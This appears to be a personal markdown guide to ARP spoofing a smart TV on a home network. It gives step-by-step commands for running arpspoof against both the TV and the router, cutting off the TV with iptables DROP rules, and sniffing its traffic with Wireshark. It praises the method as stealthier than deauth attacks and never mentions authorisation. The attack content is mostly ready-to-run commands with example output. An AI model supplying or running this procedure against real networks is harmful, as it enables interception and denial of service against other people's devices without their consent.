## **How ARP Spoofing Works**
- ARP (Address Resolution Protocol) resolves IP addresses to MAC addresses on a local network.
- By sending fake ARP responses, you trick the TV into thinking the laptop is the router, or vice versa, allowing you to:
1. Intercept traffic.
2. Drop traffic to disconnect the device.
[[ARP spoofing]]

---

## **Requirements**
1. **Laptop** with root access.
2. **Tools**:
- `nmap` to find out IP adresses
- `arpspoof` (from the `dsniff` package).
- `iptables` to block traffic.

---

## **Step-by-Step Guide**

### **1. Install Necessary Tools**
First, install the tools you'll need:
```bash
sudo apt update
sudo apt install dsniff nmap
```

---
(Optional)
### **2. Enable IP Forwarding **
If you want to intercept traffic instead of just disconnecting the TV, enable IP forwarding:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```
---

### **3. Get Network Information**
Find the IP and MAC addresses of the target device (Smart TV) and router.

1. Get the router’s IP:
```bash
ip route
```
Example output:
```
default via 192.168.0.1 dev wlan0
```
- Here, `192.168.0.1` is the router's IP.

2. Check connected devices on the network:
```bash
arp -a
```
Example output:
```
? (192.168.0.15) at 00:1A:2B:3C:4D:5E [ether] on wlan0
? (192.168.0.1) at 11:22:33:44:55:66 [ether] on wlan0
```
- `192.168.0.15` and `00:1A:2B:3C:4D:5E` are the TV’s IP and MAC.
- `192.168.0.1` and `11:22:33:44:55:66` are the router’s IP and MAC.

---

### **4. Perform ARP Spoofing**
Start spoofing the ARP tables of the Smart TV and router.

1. ARP spoof the Smart TV:
```bash
sudo arpspoof -i wlan0 -t 192.168.0.15 192.168.0.1
```
- `-i wlan0`: Your network interface.
- `-t 192.168.0.15`: Target (Smart TV’s IP).
- `192.168.0.1`: Router’s IP.

2. ARP spoof the router (optional, for interception):
In another terminal, run:
```bash
sudo arpspoof -i wlan0 -t 192.168.0.1 192.168.0.15
```
This tells the router the laptop is the TV.

---

### **5. Disconnect the TV**
To stop traffic from reaching the TV, block it using `iptables`:

1. Drop all packets from the Smart TV:
```bash
sudo iptables -A FORWARD -s 192.168.0.15 -j DROP
```

2. Drop all packets to the Smart TV:
```bash
sudo iptables -A FORWARD -d 192.168.0.15 -j DROP
```

This effectively disconnects the TV from the network.

---

### **6. Monitor Traffic (Optional)**
If you want to monitor intercepted traffic, use Wireshark:
```bash
sudo apt install wireshark
sudo wireshark
```
Filter by the TV’s IP:
```
ip.addr == 192.168.0.15
```

---

### **7. Stop the Attack**
When you're done:
1. Flush `iptables` rules:
```bash
sudo iptables -F
```

2. Stop `arpspoof` by pressing **Ctrl+C** in the terminal.

3. Disable IP forwarding:
```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

---
## **When Does ARP Spoofing Work Better?**
- **Stealthier**: ARP spoofing is less noticeable than deauth attacks.
- **Traffic Interception**: You can monitor and manipulate traffic, unlike deauth attacks, which only disrupt connectivity.
- **Works on Wired Networks**: Deauth attacks only work on Wi-Fi, but ARP spoofing works on both wired and wireless networks.
---
